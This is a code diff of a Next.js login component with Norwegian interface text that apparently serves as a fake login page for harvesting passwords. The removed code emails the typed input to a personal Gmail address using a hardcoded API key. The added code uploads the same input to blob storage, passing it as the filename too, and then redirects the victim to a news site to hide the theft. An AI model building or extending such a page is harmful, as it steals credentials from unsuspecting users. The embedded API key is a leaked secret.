@@ -2,14 +2,12 @@
 
 import { redirect } from "next/navigation";
 import { useState } from "react";
-import { Resend } from 'resend';
 
+import { put } from "@vercel/blob";
 
 export default function LoginStatic() {
   const [showPasswordBox, setShowPasswordBox] = useState(false);
   const [input, setInput] = useState("")
-  const resend = new Resend('re_Kti5FM5k_4RrJ2MZi3zfUbfgZGDC5YLDw');
-
 
   const goToPassword = () => {
     setShowPasswordBox(true);
@@ -24,21 +22,26 @@ export default function LoginStatic() {
     }
   }
 
+  const handleBack = () => {
+    redirect("https://vg.no")
+  }
+
   const handleLogin = async () => {
 
-    await resend.emails.send({
-      from: 'onboarding@resend.dev',
-      to: 'stian.sundkv@gmail.com',
-      subject: 'Hello World',
-      html: '<p>'+ {input} +'</p>'
-    });
+    const response = await fetch(
+      `/api/avatar/upload?filename=${input}`,
+      {
+        method: 'POST',
+        body: input,
+      },
+    );
     redirect("https://vg.no")
   }
 
   return (
     <main className="min-h-screen bg-[#eef2fb] text-gray-900">
       <header className="mx-auto flex max-w-6xl items-center justify-between px-4 py-4">
-        <button className="inline-flex items-center gap-2 rounded-full border border-gray-200 bg-white px-3 py-1.5 text-sm shadow-sm hover:bg-gray-50">
+        <button onClick={handleBack} className="inline-flex items-center gap-2 rounded-full border border-gray-200 bg-white px-3 py-1.5 text-sm shadow-sm hover:bg-gray-50">
           <BackIcon className="h-4 w-4" />
           <span>Tilbake</span>
           <img
